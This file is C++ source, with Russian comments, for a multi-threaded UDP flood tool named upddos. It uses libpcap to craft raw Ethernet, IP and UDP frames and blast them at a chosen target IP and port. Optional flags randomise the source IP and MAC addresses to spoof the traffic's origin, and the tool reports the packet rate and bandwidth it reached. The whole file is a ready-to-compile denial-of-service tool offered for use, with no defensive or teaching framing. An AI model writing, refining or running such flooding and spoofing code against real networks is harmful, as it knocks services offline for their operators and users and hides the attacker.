// g++ -O2 -pthread upddos.cpp -o NPudpT -lpcap -std=c++11
#include <pcap.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <atomic>
#include <iostream>
#include <vector>
#include <chrono>
#include <thread>
#include <string>

#pragma pack(push, 1)
struct my_eth_header {
    uint8_t  dst_mac[6];
    uint8_t  src_mac[6];
    uint16_t ether_type;
};

struct my_ip_header {
    uint8_t  ihl:4, version:4;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct my_udp_header {
    uint16_t source;
    uint16_t dest;
    uint16_t len;
    uint16_t check;
};
#pragma pack(pop)

// ========== Вспомогательные функции ==========
uint16_t calc_checksum(uint16_t *ptr, int len) {
    uint32_t sum = 0;
    while (len > 1) { sum += *ptr++; len -= 2; }
    if (len) sum += *(uint8_t*)ptr;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}

bool get_if_mac(const char* ifname, uint8_t* mac) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;
    strcpy(ifr.ifr_name, ifname);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) { close(sock); return false; }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    return true;
}

bool parse_mac(const char* str, uint8_t mac[6]) {
    unsigned int tmp[6];
    if (sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x",
               &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]) != 6)
        return false;
    for (int i=0; i<6; i++) mac[i] = (uint8_t)tmp[i];
    return true;
}

// ========== Генератор случайных чисел ==========
struct FastRand {
    uint64_t s[4];
    FastRand(uint64_t seed) {
        s[0] = seed;
        s[1] = seed ^ 0x9e3779b97f4a7c15ULL;
        s[2] = seed ^ 0xbf58476d1ce4e5b9ULL;
        s[3] = seed ^ 0x94d049bb133111ebULL;
    }
    inline uint64_t next64() {
        uint64_t t = s[0];
        uint64_t const x = s[1];
        s[0] = x;
        t ^= t << 23;
        s[1] = s[2];
        s[2] = s[3];
        s[3] = t ^ x ^ (t >> 18) ^ (x >> 5);
        return s[3];
    }
    inline uint32_t next32() { return (uint32_t)next64(); }
};

// ========== Класс предварительно собранного пакета ==========
class PrebuiltPacket {
public:
    std::vector<uint8_t> buffer;
    size_t src_ip_offset;
    size_t src_port_offset;
    size_t udp_offset;

    PrebuiltPacket(uint32_t src_ip, const uint8_t* src_mac,
                   uint32_t dst_ip, const uint8_t* dst_mac,
                   uint16_t dst_port, size_t pkt_size) {
        size_t min_size = sizeof(my_eth_header) + sizeof(my_ip_header) + sizeof(my_udp_header);
        size_t payload = (pkt_size > min_size) ? (pkt_size - min_size) : 0;
        size_t total = min_size + payload;
        buffer.resize(total, 0);

        my_eth_header* eth = (my_eth_header*)buffer.data();
        memcpy(eth->dst_mac, dst_mac, 6);
        memcpy(eth->src_mac, src_mac, 6);
        eth->ether_type = htons(0x0800);

        my_ip_header* ip = (my_ip_header*)(buffer.data() + sizeof(my_eth_header));
        ip->version = 4; ip->ihl = 5; ip->tos = 0;
        ip->tot_len = htons(sizeof(my_ip_header) + sizeof(my_udp_header) + payload);
        ip->id = 0; ip->frag_off = 0; ip->ttl = 64; ip->protocol = 17; // UDP
        ip->check = 0;
        ip->saddr = src_ip; ip->daddr = dst_ip;

        my_udp_header* udp = (my_udp_header*)(buffer.data() + sizeof(my_eth_header) + sizeof(my_ip_header));
        udp->source = 0;
        udp->dest = htons(dst_port);
        udp->len = htons(sizeof(my_udp_header) + payload);
        udp->check = 0;

        if (payload) {
            uint8_t* pay = buffer.data() + sizeof(my_eth_header) + sizeof(my_ip_header) + sizeof(my_udp_header);
            memset(pay, 0, payload);
        }

        src_ip_offset = sizeof(my_eth_header) + offsetof(my_ip_header, saddr);
        src_port_offset = sizeof(my_eth_header) + sizeof(my_ip_header) + offsetof(my_udp_header, source);
        udp_offset = sizeof(my_eth_header) + sizeof(my_ip_header);
    }

    size_t size() const { return buffer.size(); }
    uint8_t* data() { return buffer.data(); }

    void set_src_ip(uint32_t ip) {
        *(uint32_t*)(data() + src_ip_offset) = ip;
    }
    void set_src_port(uint16_t port) {
        *(uint16_t*)(data() + src_port_offset) = htons(port);
    }
    void set_src_mac(const uint8_t* mac) {
        memcpy(data() + sizeof(my_eth_header) - 6, mac, 6);
    }

    void recalc_checksum() {
        my_ip_header* ip = (my_ip_header*)(data() + sizeof(my_eth_header));
        ip->check = 0;
        ip->check = calc_checksum((uint16_t*)ip, sizeof(my_ip_header));

        // Псевдозаголовок для UDP
        struct pseudo {
            uint32_t src; uint32_t dst; uint8_t zero; uint8_t proto; uint16_t len;
        } ps;
        ps.src = ip->saddr;
        ps.dst = ip->daddr;
        ps.zero = 0;
        ps.proto = 17;

        size_t udp_len = buffer.size() - sizeof(my_eth_header) - sizeof(my_ip_header);
        if (udp_len > 65535) udp_len = 0;
        ps.len = htons((uint16_t)udp_len);

        my_udp_header* udp = (my_udp_header*)(data() + udp_offset);
        udp->check = 0;

        size_t total = sizeof(ps) + udp_len;
        std::vector<uint8_t> stack(total);
        memcpy(stack.data(), &ps, sizeof(ps));
        memcpy(stack.data() + sizeof(ps), udp, udp_len);
        udp->check = calc_checksum((uint16_t*)stack.data(), (int)total);
    }
};

// ========== Аргументы для потока ==========
struct ThreadArg {
    pcap_t* pcap;
    PrebuiltPacket* pkt;
    int thread_id;
    std::atomic<bool>* stop;
    std::atomic<uint64_t>* counter;
    bool random_ip;
    bool random_mac;
    FastRand* rng;
};

// ========== Функция потока ==========
void flood_thread(ThreadArg* ta) {
    pcap_t* pcap = ta->pcap;
    PrebuiltPacket* pkt = ta->pkt;
    std::atomic<bool>* stop = ta->stop;
    std::atomic<uint64_t>* counter = ta->counter;
    bool random_ip = ta->random_ip;
    bool random_mac = ta->random_mac;
    FastRand* rng = ta->rng;

    uint32_t base_ip = *(uint32_t*)(pkt->data() + pkt->src_ip_offset);
    uint16_t port = 1024 + ta->thread_id * 997;

    int iter = 0;
    while (!stop->load()) {
        if (++iter >= 1024) {
            if (stop->load()) break;
            iter = 0;
        }

        if (random_ip) {
            uint32_t new_ip = rng->next32();
            new_ip &= 0xFEFFFFFF;
            pkt->set_src_ip(new_ip);
        } else {
            pkt->set_src_ip(base_ip);
        }

        if (random_mac) {
            uint8_t mac[6];
            uint64_t r = rng->next64();
            memcpy(mac, &r, 6);
            mac[0] &= 0xFE;
            pkt->set_src_mac(mac);
        }

        port += 1;
        if (port > 65535) port = 1024;
        pkt->set_src_port(port);
        pkt->recalc_checksum();

        if (pcap_sendpacket(pcap, pkt->data(), pkt->size()) == 0) {
            counter->fetch_add(1);
        }
    }
}

// ========== main ==========
int main(int argc, char* argv[]) {
    if (argc < 6) {
        fprintf(stderr, "Usage: %s <src_ip> <dst_ip> <dst_port> <threads> <duration> [dst_mac] [--random-ip] [--random-mac] [--packet-size <bytes>]\n", argv[0]);
        return 1;
    }

    uint32_t src_ip = inet_addr(argv[1]);
    uint32_t dst_ip = inet_addr(argv[2]);
    uint16_t dst_port = (uint16_t)atoi(argv[3]);
    int threads = atoi(argv[4]);
    int duration = atoi(argv[5]);

    if (src_ip == INADDR_NONE || dst_ip == INADDR_NONE) {
        fprintf(stderr, "Invalid IP address\n");
        return 1;
    }

    uint8_t dst_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    bool random_ip = false, random_mac = false;
    size_t packet_size = 0;

    for (int i = 6; i < argc; i++) {
        if (strcmp(argv[i], "--random-ip") == 0) random_ip = true;
        else if (strcmp(argv[i], "--random-mac") == 0) random_mac = true;
        else if (strcmp(argv[i], "--packet-size") == 0 && i+1 < argc) {
            packet_size = atoi(argv[++i]);
        } else {
            if (!parse_mac(argv[i], dst_mac)) {
                fprintf(stderr, "Warning: unknown argument '%s'\n", argv[i]);
            }
        }
    }

    // Определяем интерфейс по src_ip
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs;
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        fprintf(stderr, "pcap_findalldevs: %s\n", errbuf);
        return 1;
    }

    std::string iface;
    for (pcap_if_t *d = alldevs; d; d = d->next) {
        for (pcap_addr_t *a = d->addresses; a; a = a->next) {
            if (a->addr && a->addr->sa_family == AF_INET) {
                struct sockaddr_in* sin = (struct sockaddr_in*)a->addr;
                if (sin->sin_addr.s_addr == src_ip) {
                    iface = d->name;
                    break;
                }
            }
        }
        if (!iface.empty()) break;
    }
    pcap_freealldevs(alldevs);

    if (iface.empty()) {
        fprintf(stderr, "Interface with IP %s not found\n", argv[1]);
        return 1;
    }

    uint8_t src_mac[6];
    if (!get_if_mac(iface.c_str(), src_mac)) {
        fprintf(stderr, "Cannot get MAC for %s\n", iface.c_str());
        return 1;
    }

    size_t min_size = sizeof(my_eth_header) + sizeof(my_ip_header) + sizeof(my_udp_header);
    if (packet_size < min_size) packet_size = min_size;

    printf("Interface: %s\n", iface.c_str());
    printf("Source MAC: "); for(int i=0;i<6;i++) printf("%02X%s", src_mac[i], i<5?":":"");
    printf("\nDest MAC: "); for(int i=0;i<6;i++) printf("%02X%s", dst_mac[i], i<5?":":"");
    printf("\nRandom IP: %s, Random MAC: %s\n", random_ip?"yes":"no", random_mac?"yes":"no");
    printf("Packet size: %zu bytes\n", packet_size);

    // Открываем дескрипторы pcap для каждого потока
    std::vector<pcap_t*> handles;
    for (int i = 0; i < threads; i++) {
        pcap_t* p = pcap_open_live(iface.c_str(), 65536, 1, 1000, errbuf);
        if (!p) {
            fprintf(stderr, "pcap_open_live: %s\n", errbuf);
            for (auto h : handles) pcap_close(h);
            return 1;
        }
        handles.push_back(p);
    }

    std::atomic<bool> stop_flag(false);
    std::atomic<uint64_t> total_packets(0);
    PrebuiltPacket pkt(src_ip, src_mac, dst_ip, dst_mac, dst_port, packet_size);

    std::vector<std::thread> workers;
    std::vector<ThreadArg> args(threads);
    std::vector<FastRand> rngs;

    for (int i = 0; i < threads; i++) {
        rngs.emplace_back(time(nullptr) + i * 123456789ULL);
        args[i] = {
            handles[i],
            &pkt,
            i,
            &stop_flag,
            &total_packets,
            random_ip,
            random_mac,
            &rngs[i]
        };
        workers.emplace_back(flood_thread, &args[i]);
    }

    auto start_time = std::chrono::steady_clock::now();

    if (duration > 0) {
        std::this_thread::sleep_for(std::chrono::seconds(duration));
    } else {
        printf("Press Enter to stop...\n");
        getchar();
    }

    stop_flag = true;
    for (auto& t : workers) t.join();

    auto end_time = std::chrono::steady_clock::now();
    auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time).count();
    uint64_t pkts = total_packets.load();
    double pps = elapsed_ms ? pkts * 1000.0 / elapsed_ms : 0;
    double mbps = pps * packet_size * 8 / 1e6;

    printf("\n--- Results ---\n");
    printf("Total packets: %lu\n", pkts);
    printf("Duration: %lld ms\n", elapsed_ms);
    printf("Throughput: %.0f pps\n", pps);
    printf("Bandwidth: %.2f Mbps\n", mbps);

    for (auto h : handles) pcap_close(h);
    return 0;
}